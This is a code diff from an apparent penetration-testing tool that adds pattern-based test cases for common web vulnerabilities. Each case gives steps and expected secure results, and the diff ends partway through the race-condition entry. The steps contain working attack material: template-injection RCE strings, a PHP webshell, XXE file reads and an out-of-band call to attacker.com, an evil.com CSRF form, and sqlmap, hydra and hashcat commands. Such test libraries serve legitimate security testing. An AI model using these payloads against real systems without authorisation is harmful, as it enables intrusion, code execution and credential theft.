@@ -19,6 +19,26 @@ from pydantic import BaseModel
 from app.core.config import get_settings
 from app.core.dependencies import get_current_user
 from app.models.db.user import User
+from app.api.v1.attack_patterns import (
+    XSS_PAYLOADS, XSS_TEST_PARAMS, DOM_XSS_PAYLOADS, DOM_XSS_SINK_PARAMS,
+    SQLI_ERROR_PAYLOADS, SQLI_TIME_PAYLOADS, SQLI_TEST_PARAMS, SQLI_ERROR_PATTERNS,
+    SSRF_PARAMS, SSRF_TARGETS, SSRF_BYPASS_ENCODINGS,
+    IDOR_ID_PARAMS, IDOR_ENDPOINT_PATTERNS, IDOR_REST_PATHS,
+    REDIRECT_PARAMS, REDIRECT_PAYLOADS,
+    SSTI_PAYLOADS, SSTI_TEST_FIELDS,
+    NOSQL_INJECTION_PAYLOADS, NOSQL_URL_PAYLOADS, NOSQL_SLEEP_PAYLOADS,
+    XXE_PAYLOADS, FILE_UPLOAD_PATHS, FILE_UPLOAD_BYPASS_EXTENSIONS, FILE_UPLOAD_MALICIOUS_CONTENT,
+    INFO_DISCLOSURE_PATHS, PRIV_ESC_PARAMS, PRIV_ESC_ADMIN_PATHS,
+    MASS_ASSIGNMENT_ROLE_FIELDS, ATO_PASSWORD_RESET_TESTS, ATO_RESET_ENDPOINTS,
+    WEAK_CREDENTIAL_PAIRS, JWT_WEAK_SECRETS, JWT_ALG_NONE_VARIANTS, JWT_KID_PAYLOADS,
+    CSRF_BYPASS_HEADERS, CSRF_SENSITIVE_ACTIONS,
+    PROTOTYPE_POLLUTION_PAYLOADS,
+    BUSINESS_LOGIC_TESTS, BUSINESS_LOGIC_BASKET_ATTACKS, COUPON_CODES,
+    GRAPHQL_PATHS, GRAPHQL_INTROSPECTION, GRAPHQL_AUTH_BYPASS_QUERIES,
+    CACHE_POISON_HEADERS, CACHE_POISON_VALUES, RACE_CONDITION_ENDPOINTS,
+    COMMON_SENSITIVE_PATHS, CORS_ATTACK_ORIGINS, CORS_SENSITIVE_PATHS,
+    DESERIALIZATION_PATHS, MONITORING_PATHS,
+)
 
 logger = logging.getLogger(__name__)
 settings = get_settings()
@@ -2963,6 +2983,672 @@ TEST_CASES: list[dict] = [
 ]
 
 # ─────────────────────────────────────────────────────────────────────────────
+# Pattern-derived test cases  (built from attack_patterns.py — 5700+ patterns)
+# These are richer and more payload-specific than the base library above.
+# Deduplication happens in _filter_test_cases before returning to callers.
+# ─────────────────────────────────────────────────────────────────────────────
+
+def _fmt_payloads(items: list, n: int = 6) -> list[str]:
+    return [f"Payload: {p}" for p in items[:n]]
+
+
+def _ssrf_flat(n: int = 6) -> list[str]:
+    urls = [u for u, _ in SSRF_TARGETS][:n]
+    return [f"Target: {u}" for u in urls]
+
+
+PATTERN_TEST_CASES: list[dict] = [
+
+    # ── XSS ──────────────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-XSS01",
+        "title": "Reflected XSS — Pattern Library (36 payloads)",
+        "category": "Web Application",
+        "severity": "high",
+        "description": (
+            "Test all user-controlled parameters for reflected XSS using a curated set of payloads "
+            "covering HTML injection, event handler bypass, SVG, polyglot, and WAF evasion vectors. "
+            f"Commonly vulnerable params: {', '.join(XSS_TEST_PARAMS[:8])}."
+        ),
+        "attack_pattern": "Inject payloads into query params, form fields, headers, and JSON fields. "
+                          "Look for unescaped output in HTML response.",
+        "steps": [
+            f"Target params: {', '.join(XSS_TEST_PARAMS)}",
+            *_fmt_payloads(XSS_PAYLOADS, 8),
+            "Check if output appears unescaped in: body, attribute, JS context, or URL",
+            "For JSON APIs: inject into string values, check if response is rendered in a browser",
+            "Escalate: steal cookies, exfiltrate localStorage, trigger requests to attacker domain",
+        ],
+        "expected_result": "All special chars (< > \" ' `) are HTML-encoded or rejected.",
+        "cwe": "CWE-79", "owasp": "A03:2021",
+        "tools": {"nuclei_tags": ["xss", "reflected"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["xss", "injection", "client-side"],
+    },
+    {
+        "id": "TC-PAT-XSS02",
+        "title": "DOM-Based XSS — Sink & Source Pattern Coverage",
+        "category": "Web Application",
+        "severity": "high",
+        "description": (
+            "DOM XSS occurs when JavaScript writes attacker-controlled data to dangerous sinks "
+            f"(innerHTML, eval, document.write). High-risk params: {', '.join(DOM_XSS_SINK_PARAMS[:8])}."
+        ),
+        "attack_pattern": "Inject into URL fragments (#) and query params that JS reads without server round-trip.",
+        "steps": [
+            f"Sink params: {', '.join(DOM_XSS_SINK_PARAMS)}",
+            *_fmt_payloads(DOM_XSS_PAYLOADS, 6),
+            "Search JS source for: innerHTML, outerHTML, document.write, eval, location.href =",
+            "Inject into #fragment — check if content is written to DOM without sanitisation",
+            "Use browser DevTools → Sources → search JS for dangerous sinks",
+        ],
+        "expected_result": "No user-controlled data reaches DOM sinks without sanitisation.",
+        "cwe": "CWE-79", "owasp": "A03:2021",
+        "tools": {"nuclei_tags": ["xss", "dom"]},
+        "applicable_to": ["web"],
+        "tags": ["xss", "dom", "client-side"],
+    },
+
+    # ── SQLi ──────────────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-SQLI01",
+        "title": "SQL Injection — Error-Based Detection (Pattern Library)",
+        "category": "Web Application",
+        "severity": "critical",
+        "description": (
+            f"Probe {len(SQLI_TEST_PARAMS)} common DB-facing params with error-triggering payloads. "
+            f"Error signatures checked: {', '.join(SQLI_ERROR_PATTERNS[:4])}…"
+        ),
+        "attack_pattern": "Submit malformed SQL syntax and detect DB error messages in response.",
+        "steps": [
+            f"Target params: {', '.join(SQLI_TEST_PARAMS)}",
+            *_fmt_payloads(SQLI_ERROR_PAYLOADS, 8),
+            f"Confirm error: look for patterns — {', '.join(SQLI_ERROR_PATTERNS[:3])}",
+            "Use sqlmap: sqlmap -u 'URL?param=1' --batch --level 3",
+            "Enumerate: sqlmap -u URL -p param --dbs --tables",
+        ],
+        "expected_result": "No SQL errors in response. All DB queries use parameterised statements.",
+        "cwe": "CWE-89", "owasp": "A03:2021",
+        "tools": {"nuclei_tags": ["sqli", "sqli-error"], "ffuf_wordlist": ""},
+        "applicable_to": ["web", "api"],
+        "tags": ["sqli", "injection", "critical"],
+    },
+    {
+        "id": "TC-PAT-SQLI02",
+        "title": "Blind SQL Injection — Time-Based Detection",
+        "category": "Web Application",
+        "severity": "critical",
+        "description": "When error messages are suppressed, time-based payloads confirm injection by observing response delays.",
+        "attack_pattern": "Inject time-delay payloads; compare response time with and without payload.",
+        "steps": [
+            *_fmt_payloads(SQLI_TIME_PAYLOADS, 6),
+            "Baseline: note normal response time",
+            "Inject sleep payload — if response takes 5+ s, SQLi confirmed",
+            "MySQL: 1' AND SLEEP(5)--  |  MSSQL: 1'; WAITFOR DELAY '0:0:5'--",
+            "PostgreSQL: 1'; SELECT pg_sleep(5)--  |  Oracle: 1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
+            "Automate with sqlmap: sqlmap -u URL -p param --technique=T --time-sec=5",
+        ],
+        "expected_result": "No response time difference. Prepared statements prevent time-based injection.",
+        "cwe": "CWE-89", "owasp": "A03:2021",
+        "tools": {"nuclei_tags": ["sqli", "blind-sqli"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["sqli", "blind", "time-based", "injection"],
+    },
+
+    # ── SSRF ──────────────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-SSRF01",
+        "title": "SSRF — Internal Service Probe with Bypass Encodings",
+        "category": "Web Application",
+        "severity": "critical",
+        "description": (
+            f"Test {len(SSRF_PARAMS)} SSRF-prone params against cloud metadata, internal addresses, "
+            f"and {len(SSRF_BYPASS_ENCODINGS)} bypass encodings."
+        ),
+        "attack_pattern": "Supply server-side URL params pointing to cloud metadata and internal hosts.",
+        "steps": [
+            f"Target params: {', '.join(SSRF_PARAMS[:12])}",
+            *_ssrf_flat(6),
+            f"Bypass encodings: {', '.join(SSRF_BYPASS_ENCODINGS[:4])}",
+            "AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "GCP metadata: http://metadata.google.internal/computeMetadata/v1/",
+            "Use Burp Collaborator / interactsh to detect blind SSRF via DNS callback",
+        ],
+        "expected_result": "Server must block outbound requests to internal ranges and cloud metadata IPs.",
+        "cwe": "CWE-918", "owasp": "A10:2021",
+        "tools": {"nuclei_tags": ["ssrf"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["ssrf", "injection", "cloud"],
+    },
+
+    # ── IDOR ──────────────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-IDOR01",
+        "title": "IDOR — Object Reference Enumeration (Pattern Library)",
+        "category": "Web Application",
+        "severity": "high",
+        "description": (
+            f"Test {len(IDOR_ID_PARAMS)} identity params and {len(IDOR_REST_PATHS)} REST patterns "
+            "for insecure direct object references."
+        ),
+        "attack_pattern": "Replace resource IDs with neighbouring values; access as different user.",
+        "steps": [
+            f"High-risk params: {', '.join(IDOR_ID_PARAMS[:12])}",
+            f"REST path patterns: {', '.join(IDOR_REST_PATHS[:6])}",
+            "Step 1: Authenticate as User A, note your resource ID (e.g. /users/1001/profile)",
+            "Step 2: Authenticate as User B, send User A's resource ID — should get 403",
+            "Step 3: Try sequential IDs: 1000, 999, 1002",
+            "Step 4: Try GUIDs from other users observed in JS/API responses",
+            "Step 5: Verify IDOR in POST/PUT too — not just GET",
+        ],
+        "expected_result": "Object-level authorisation check passes for every resource access.",
+        "cwe": "CWE-639", "owasp": "A01:2021",
+        "tools": {"nuclei_tags": ["idor"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["idor", "access-control", "bola"],
+    },
+
+    # ── Open Redirect ─────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-REDIR01",
+        "title": "Open Redirect — 20-Variant Payload Coverage",
+        "category": "Web Application",
+        "severity": "medium",
+        "description": (
+            f"Test {len(REDIRECT_PARAMS)} redirect params with {len(REDIRECT_PAYLOADS)} bypass variants "
+            "including schema confusion, path traversal, and URL encoding tricks."
+        ),
+        "attack_pattern": "Supply attacker-controlled URLs in redirect params to send victims off-domain.",
+        "steps": [
+            f"Target params: {', '.join(REDIRECT_PARAMS[:8])}",
+            *_fmt_payloads(REDIRECT_PAYLOADS[:8]),
+            "Check Location header after login/logout flow — does it redirect to attacker.com?",
+            "Test: //attacker.com  /\\attacker.com  https:attacker.com",
+            "Combine with XSS: ?next=javascript:alert(1)",
+            "Use for phishing: redirect after valid login to attacker landing page",
+        ],
+        "expected_result": "Redirect destinations validated against an allowlist of trusted domains.",
+        "cwe": "CWE-601", "owasp": "A01:2021",
+        "tools": {"nuclei_tags": ["redirect"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["redirect", "phishing"],
+    },
+
+    # ── SSTI ──────────────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-SSTI01",
+        "title": "SSTI — Template Engine RCE Probe",
+        "category": "Advanced Injection",
+        "severity": "critical",
+        "description": (
+            f"Probe {len(SSTI_TEST_FIELDS)} template-related params with {len(SSTI_PAYLOADS)} engine-specific payloads. "
+            "Covers Jinja2, Twig, FreeMarker, Pebble, Velocity."
+        ),
+        "attack_pattern": "Submit template syntax — if the engine evaluates it, escalate to RCE.",
+        "steps": [
+            f"Target fields: {', '.join(SSTI_TEST_FIELDS[:8])}",
+            *_fmt_payloads(SSTI_PAYLOADS, 8),
+            "Confirm: {{7*7}} → 49 (Jinja2/Twig)  |  ${7*7} → 49 (FreeMarker)",
+            "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+            "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+            "FreeMarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+        ],
+        "expected_result": "Template expressions are not evaluated. Sandbox escapes return errors.",
+        "cwe": "CWE-94", "owasp": "A03:2021",
+        "tools": {"nuclei_tags": ["ssti"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["ssti", "rce", "injection"],
+    },
+
+    # ── NoSQL ─────────────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-NOSQL01",
+        "title": "NoSQL Injection — MongoDB Operator Bypass",
+        "category": "Advanced Injection",
+        "severity": "high",
+        "description": (
+            f"Inject MongoDB operators ($gt, $ne, $regex, $where) using {len(NOSQL_INJECTION_PAYLOADS)} "
+            f"body payloads and {len(NOSQL_URL_PAYLOADS)} URL-encoded variants."
+        ),
+        "attack_pattern": "Replace parameter values with MongoDB operator objects to bypass authentication or dump collections.",
+        "steps": [
+            *_fmt_payloads(NOSQL_INJECTION_PAYLOADS, 6),
+            *_fmt_payloads(NOSQL_SLEEP_PAYLOADS[:2]),
+            "Login bypass: POST {\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}",
+            "Wildcard match: ?search[$regex]=.*  or  ?search[$ne]=invalid",
+            "Blind: inject $where with sleep() to confirm via response delay",
+            "Tool: nosqli -u 'URL' -p param --attack auth",
+        ],
+        "expected_result": "MongoDB query input is validated; operators are not accepted as parameter values.",
+        "cwe": "CWE-943", "owasp": "A03:2021",
+        "tools": {"nuclei_tags": ["nosqli"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["nosqli", "mongodb", "injection"],
+    },
+
+    # ── XXE ───────────────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-XXE01",
+        "title": "XXE — External Entity Injection (Full Payload Set)",
+        "category": "Web Application",
+        "severity": "critical",
+        "description": (
+            f"Test XML-accepting endpoints with {len(XXE_PAYLOADS)} XXE payloads covering "
+            "file read, SSRF, blind OOB exfiltration, and DTD-based attacks."
+        ),
+        "attack_pattern": "Define external entity pointing to sensitive file or internal URL; observe if included in response.",
+        "steps": [
+            "Identify XML-accepting endpoints (Content-Type: application/xml, text/xml, multipart/form-data with XML parts)",
+            "File read: <!DOCTYPE x[<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>",
+            "SSRF: <!DOCTYPE x[<!ENTITY xxe SYSTEM 'http://169.254.169.254/'>]><x>&xxe;</x>",
+            "Blind OOB: <!DOCTYPE x[<!ENTITY % xxe SYSTEM 'http://attacker.com/'>%xxe;]>",
+            *_fmt_payloads(XXE_PAYLOADS[:4]),
+            "Also test SVG upload, DOCX/XLSX file processing, SAML requests — all carry XML",
+        ],
+        "expected_result": "XML parser has external entities disabled (FEATURE_SECURE_PROCESSING = true).",
+        "cwe": "CWE-611", "owasp": "A05:2021",
+        "tools": {"nuclei_tags": ["xxe"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["xxe", "injection", "oob"],
+    },
+
+    # ── File Upload ───────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-UPLOAD01",
+        "title": "File Upload — Extension Bypass & RCE",
+        "category": "File Upload",
+        "severity": "critical",
+        "description": (
+            f"Attempt unrestricted code upload using {len(FILE_UPLOAD_BYPASS_EXTENSIONS)} extension bypass variants. "
+            f"Common upload paths probed: {', '.join(FILE_UPLOAD_PATHS[:4])}."
+        ),
+        "attack_pattern": "Upload webshell using extension bypass; access the file via direct URL to trigger RCE.",
+        "steps": [
+            f"Bypass extensions: {', '.join(FILE_UPLOAD_BYPASS_EXTENSIONS[:10])}",
+            "Upload: <?php system($_GET['cmd']); ?> as shell.php",
+            "If .php blocked: try shell.PHP, shell.php5, shell.phtml, shell.php%00.jpg",
+            "Change Content-Type to image/jpeg while keeping .php extension",
+            f"Probe upload paths: {', '.join(FILE_UPLOAD_PATHS[:6])}",
+            "Path traversal in filename: ../../webroot/shell.php",
+            "After upload, request the file directly and append ?cmd=id",
+        ],
+        "expected_result": "Only allow-listed content types accepted. Uploaded files not served as executable.",
+        "cwe": "CWE-434", "owasp": "A04:2021",
+        "tools": {"nuclei_tags": ["file-upload", "rce"]},
+        "applicable_to": ["web"],
+        "tags": ["file-upload", "rce", "critical"],
+    },
+
+    # ── Sensitive Paths ───────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-DISC01",
+        "title": "Information Disclosure — Sensitive Path Probe",
+        "category": "Information Disclosure",
+        "severity": "high",
+        "description": (
+            f"Probe {len(COMMON_SENSITIVE_PATHS) + len(INFO_DISCLOSURE_PATHS)} known paths for "
+            "exposed configs, source, credentials, and debug endpoints."
+        ),
+        "attack_pattern": "GET request to known sensitive paths; check for 200 responses with secrets.",
+        "steps": [
+            f"Config paths: {', '.join(COMMON_SENSITIVE_PATHS[:8])}",
+            f"Debug/admin paths: {', '.join(INFO_DISCLOSURE_PATHS[:8])}",
+            f"Monitoring paths: {', '.join(MONITORING_PATHS[:6])}",
+            "ffuf -u TARGET/FUZZ -w wordlist.txt -mc 200,301,302 -t 40",
+            "Check .env — look for DB passwords, API keys, SECRET_KEY",
+            "Check /actuator/env, /actuator/heapdump for Spring Boot apps",
+        ],
+        "expected_result": "Sensitive paths return 403/404. No credentials or internal data exposed.",
+        "cwe": "CWE-200", "owasp": "A05:2021",
+        "tools": {"nuclei_tags": ["exposure", "misconfig", "config"], "ffuf_wordlist": "common.txt"},
+        "applicable_to": ["web", "api"],
+        "tags": ["exposure", "recon", "config"],
+    },
+
+    # ── Privilege Escalation ──────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-PRIVESC01",
+        "title": "Privilege Escalation — Role Param Injection & Admin Path Access",
+        "category": "Authentication",
+        "severity": "critical",
+        "description": (
+            f"Test {len(PRIV_ESC_PARAMS)} privilege-related params and {len(PRIV_ESC_ADMIN_PATHS)} "
+            "admin paths for horizontal/vertical privilege escalation."
+        ),
+        "attack_pattern": "Inject role/permission fields in requests; access admin paths as low-privilege user.",
+        "steps": [
+            f"Privilege params: {', '.join(PRIV_ESC_PARAMS[:10])}",
+            f"Admin paths: {', '.join(PRIV_ESC_ADMIN_PATHS[:8])}",
+            "Add role=admin or isAdmin=true to request body",
+            "Access admin paths authenticated as regular user — check for 200 vs 403",
+            "Try path bypass: /admin/../user/../admin  or  /user/../../admin",
+            "Add headers: X-Original-URL: /admin  X-Forwarded-For: 127.0.0.1",
+        ],
+        "expected_result": "Role checks are server-side. Admin paths return 403 for non-admin users.",
+        "cwe": "CWE-269", "owasp": "A01:2021",
+        "tools": {"nuclei_tags": ["priv-esc", "admin-panel"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["privesc", "access-control", "admin"],
+    },
+
+    # ── Mass Assignment ───────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-MASS01",
+        "title": "Mass Assignment — Unauthorised Field Binding",
+        "category": "Web Application",
+        "severity": "high",
+        "description": (
+            f"Inject {len(MASS_ASSIGNMENT_ROLE_FIELDS)} privilege-escalating fields into JSON "
+            "bodies to test for mass assignment vulnerabilities."
+        ),
+        "attack_pattern": "Add extra fields to JSON PUT/PATCH requests; observe if server accepts and persists them.",
+        "steps": [
+            f"Privileged fields to inject: {', '.join(MASS_ASSIGNMENT_ROLE_FIELDS[:10])}",
+            'Add {"role": "admin"} to existing update request body',
+            'Try: {"is_admin": true, "verified": true, "subscription_tier": "enterprise"}',
+            "Check /api-docs or /swagger for undocumented internal fields",
+            "Observe response — does it echo back injected fields?",
+            "Re-fetch your profile — did privilege change persist?",
+        ],
+        "expected_result": "Framework allowlists accepted fields. Privileged fields cannot be set by end-users.",
+        "cwe": "CWE-915", "owasp": "A01:2021",
+        "tools": {"nuclei_tags": ["mass-assignment"]},
+        "applicable_to": ["api"],
+        "tags": ["mass-assignment", "access-control"],
+    },
+
+    # ── Account Takeover ──────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-ATO01",
+        "title": "Account Takeover — Password Reset Flow Attacks",
+        "category": "Authentication",
+        "severity": "critical",
+        "description": (
+            f"Test {len(ATO_PASSWORD_RESET_TESTS)} known ATO vectors: Host header injection, "
+            f"parameter pollution, token reuse. Reset endpoints: {', '.join(ATO_RESET_ENDPOINTS[:4])}."
+        ),
+        "attack_pattern": "Manipulate password reset flow to receive reset link at attacker-controlled address.",
+        "steps": [
+            *[f"Test: {t['description']}" for t in ATO_PASSWORD_RESET_TESTS[:8]],
+            f"Reset endpoints to test: {', '.join(ATO_RESET_ENDPOINTS)}",
+            "Host header injection: change Host: to attacker.com during reset — check link domain",
+            "Parameter pollution: send email=victim@x.com&email=attacker@x.com",
+            "Try reusing expired reset tokens — check if server invalidates after first use",
+        ],
+        "expected_result": "Reset link domain is hardcoded server-side. Tokens expire after first use.",
+        "cwe": "CWE-640", "owasp": "A07:2021",
+        "tools": {"nuclei_tags": ["account-takeover", "password-reset"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["ato", "account-takeover", "password-reset"],
+    },
+
+    # ── Weak Credentials ──────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-CRED01",
+        "title": "Weak / Default Credentials — Bug Bounty Credential Pairs",
+        "category": "Authentication",
+        "severity": "critical",
+        "description": (
+            f"Test {len(WEAK_CREDENTIAL_PAIRS)} real-world default and commonly reused credential "
+            "pairs from bug bounty reports."
+        ),
+        "attack_pattern": "Attempt login with default and commonly leaked credential pairs.",
+        "steps": [
+            *[f"Try: {u} / {p}" for u, p in WEAK_CREDENTIAL_PAIRS[:10]],
+            "Run hydra: hydra -C credentials.txt ssh://target",
+            "Test admin panels, staging environments, internal tools",
+            "Check for default credentials in technology-specific docs (Jenkins, Grafana, etc.)",
+            "Verify rate limiting is active after N failures",
+        ],
+        "expected_result": "All default passwords changed. Rate limiting and lockout active on login.",
+        "cwe": "CWE-798", "owasp": "A07:2021",
+        "tools": {"nuclei_tags": ["default-login"]},
+        "applicable_to": ["web", "network"],
+        "tags": ["credentials", "brute-force", "default-login"],
+    },
+
+    # ── JWT ───────────────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-JWT01",
+        "title": "JWT — alg:none, Weak Secret, KID Injection",
+        "category": "Authentication",
+        "severity": "high",
+        "description": (
+            f"Test JWTs with {len(JWT_ALG_NONE_VARIANTS)} alg:none variants, "
+            f"{len(JWT_WEAK_SECRETS)} weak HMAC secrets, and {len(JWT_KID_PAYLOADS)} kid injection payloads."
+        ),
+        "attack_pattern": "Forge JWT with algorithm downgrade or cracked secret to impersonate higher-privilege user.",
+        "steps": [
+            f"alg:none variants: {', '.join(JWT_ALG_NONE_VARIANTS)}",
+            f"Weak secrets: {', '.join(JWT_WEAK_SECRETS[:8])}",
+            f"KID payloads: {', '.join(JWT_KID_PAYLOADS[:4])}",
+            "1. Decode JWT at jwt.io — inspect header.alg and payload claims",
+            "2. Set alg to none, strip signature — does server accept it?",
+            "3. hashcat -a 0 -m 16500 token.txt rockyou.txt — crack HMAC secret",
+            "4. Modify sub/role claim, re-sign with cracked secret",
+            "5. RS256→HS256: sign with server's public key as HMAC secret",
+        ],
+        "expected_result": "alg:none rejected. Weak secrets not used. kid parameter sanitised.",
+        "cwe": "CWE-347", "owasp": "A02:2021",
+        "tools": {"nuclei_tags": ["jwt"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["jwt", "auth", "crypto"],
+    },
+
+    # ── CSRF ──────────────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-CSRF01",
+        "title": "CSRF — State-Changing Actions & Header Bypass Vectors",
+        "category": "Web Application",
+        "severity": "medium",
+        "description": (
+            f"Test {len(CSRF_SENSITIVE_ACTIONS)} sensitive state-changing actions for CSRF protection gaps. "
+            f"Includes {len(CSRF_BYPASS_HEADERS)} known bypass header vectors."
+        ),
+        "attack_pattern": "Build cross-origin form/fetch targeting state-changing endpoints; verify request fires without CSRF token.",
+        "steps": [
+            f"Sensitive actions: {', '.join(CSRF_SENSITIVE_ACTIONS[:8])}",
+            f"Bypass headers to try: {', '.join(list(CSRF_BYPASS_HEADERS.keys())[:6])}",
+            "Build HTML form on evil.com pointing to target state-changing URL",
+            "Submit form while victim is authenticated — did action execute?",
+            "Check SameSite cookie attribute: Lax/Strict blocks most CSRF",
+            "For JSON APIs: try Content-Type: text/plain with JSON body",
+            "Try removing Origin/Referer header — does server still accept?",
+        ],
+        "expected_result": "CSRF tokens on all state-changing forms. SameSite=Strict or Lax on session cookies.",
+        "cwe": "CWE-352", "owasp": "A01:2021",
+        "tools": {"nuclei_tags": ["csrf"]},
+        "applicable_to": ["web"],
+        "tags": ["csrf", "client-side"],
+    },
+
+    # ── Prototype Pollution ───────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-PROTO01",
+        "title": "Prototype Pollution — Object Merge / Deep Clone Attacks",
+        "category": "Advanced Injection",
+        "severity": "high",
+        "description": (
+            f"Test {len(PROTOTYPE_POLLUTION_PAYLOADS)} prototype pollution payloads in JSON request bodies "
+            "and query strings targeting JS-based backends and frontend libraries."
+        ),
+        "attack_pattern": "Inject __proto__ or constructor.prototype fields to pollute the Object prototype and alter application behaviour.",
+        "steps": [
+            *_fmt_payloads(PROTOTYPE_POLLUTION_PAYLOADS, 6),
+            'POST body: {"__proto__":{"isAdmin":true}}',
+            'Query: ?__proto__[isAdmin]=true  or  ?constructor[prototype][isAdmin]=true',
+            "Check if subsequent requests return elevated privileges",
+            "Tool: ppmap -u 'https://target.com' to scan for prototype pollution",
+            "For client-side: check jQuery.extend, lodash.merge, hoek.merge with polluted input",
+        ],
+        "expected_result": "Merge/clone functions sanitise __proto__ and constructor keys.",
+        "cwe": "CWE-1321", "owasp": "A03:2021",
+        "tools": {"nuclei_tags": ["prototype-pollution"]},
+        "applicable_to": ["web", "api"],
+        "tags": ["prototype-pollution", "javascript", "injection"],
+    },
+
+    # ── Business Logic ────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-BL01",
+        "title": "Business Logic — Price / Quantity / Coupon Manipulation",
+        "category": "Business Logic",
+        "severity": "high",
+        "description": (
+            f"Execute {len(BUSINESS_LOGIC_TESTS)} business logic test cases including negative quantity, "
+            f"price override, coupon stacking, and race conditions. "
+            f"Known valid coupon codes to abuse: {', '.join(COUPON_CODES[:5])}."
+        ),
+        "attack_pattern": "Manipulate financial parameters client-side; attempt to purchase items at zero or negative cost.",
+        "steps": [
+            *[f"Test: {t['test']} — {t['description']}" for t in BUSINESS_LOGIC_TESTS[:6]],
+            "Set quantity=-1 and checkout — check if balance increases",
+            "Set price=0.01 in request body — check if server recalculates server-side",
+            f"Try coupon codes: {', '.join(COUPON_CODES[:6])}",
+            "Apply same coupon twice in rapid succession (race condition)",
+            f"Basket attacks: {', '.join(str(a) for a in BUSINESS_LOGIC_BASKET_ATTACKS[:3])}",
+        ],
+        "expected_result": "All pricing and business rule enforcement is server-side. Coupons validated once.",
+        "cwe": "CWE-840", "owasp": "A04:2021",
+        "tools": {},
+        "applicable_to": ["web", "api"],
+        "tags": ["business-logic", "payments", "logic-flaw"],
+    },
+
+    # ── GraphQL ───────────────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-GQL01",
+        "title": "GraphQL — Introspection, Auth Bypass & Batching Attacks",
+        "category": "API Security",
+        "severity": "high",
+        "description": (
+            f"Test {len(GRAPHQL_PATHS)} GraphQL endpoints for enabled introspection, "
+            f"auth bypass via query manipulation, and {len(GRAPHQL_AUTH_BYPASS_QUERIES)} known bypass queries."
+        ),
+        "attack_pattern": "Use introspection to map schema, then craft queries to access unauthorised data.",
+        "steps": [
+            f"Common paths: {', '.join(GRAPHQL_PATHS)}",
+            f"Introspection query: {GRAPHQL_INTROSPECTION}",
+            *[f"Auth bypass: {q[:80]}…" for q in GRAPHQL_AUTH_BYPASS_QUERIES[:3]],
+            "Check if introspection is disabled in production (should be)",
+            "Test field-level auth: query fields from other users' objects",
+            "Batching attack: send 1000 login mutations in one request to bypass rate limits",
+            "Alias attack: alias same field 100x to amplify response cost",
+        ],
+        "expected_result": "Introspection disabled in prod. Per-field and per-object auth enforced. Batching rate-limited.",
+        "cwe": "CWE-284", "owasp": "A01:2021",
+        "tools": {"nuclei_tags": ["graphql"]},
+        "applicable_to": ["api"],
+        "tags": ["graphql", "api", "introspection"],
+    },
+
+    # ── Cache Poisoning ───────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-CACHE01",
+        "title": "Web Cache Poisoning — Unkeyed Header Injection",
+        "category": "Web Application",
+        "severity": "high",
+        "description": (
+            f"Test {len(CACHE_POISON_HEADERS)} unkeyed headers with {len(CACHE_POISON_VALUES)} "
+            "poisoning values to inject malicious content into cached responses."
+        ),
+        "attack_pattern": "Supply unkeyed request headers that alter the response; if cached, serve malicious content to all users.",
+        "steps": [
+            f"Headers to test: {', '.join(CACHE_POISON_HEADERS[:8])}",
+            f"Payloads: {', '.join(CACHE_POISON_VALUES[:4])}",
+            "Add X-Forwarded-Host: attacker.com — check if response reflects in JS src/href",
+            "If reflected, wait for cache; request without the header — is attacker.com still there?",
+            "Check for Cache-Control headers — cacheable 200s are highest risk",
+            "Tool: param-miner (Burp extension) to detect unkeyed parameters",
+        ],
+        "expected_result": "All cache-varying headers are keyed. Unkeyed headers don't affect response content.",
+        "cwe": "CWE-444", "owasp": "A05:2021",
+        "tools": {"nuclei_tags": ["cache-poisoning"]},
+        "applicable_to": ["web"],
+        "tags": ["cache-poisoning", "headers"],
+    },
+
+    # ── Race Conditions ───────────────────────────────────────────────────────
+    {
+        "id": "TC-PAT-RACE01",
+        "title": "Race Conditions — Concurrent Request Exploitation",
+        "category": "Business Logic",
+        "severity": "high",
+        "description": (
+            f"Test {len(RACE_CONDITION_ENDPOINTS)} race-condition-prone endpoint patterns "
+            "by sending simultaneous requests to exploit TOCTOU gaps."
+        ),
+        "attack_pattern": "Send 20-50 concurrent identical requests to bypass one-time-use restrictions.",
+        "steps": [
+            f"High-risk endpoints: {', '.join(RACE_CONDITION_ENDPOINTS[:8])}",
+            "Use Burp Turbo Intruder: send 20 concurrent POST requests to coupon/redeem",
+            "Python: asyncio + aiohttp to send simultaneous requests",
+            "Test: single-use coupons, one-time OTPs, gift card redemption, vote/like endpoints",
+            "Check if balance/stock updates use atomic DB operations or application-level locks",
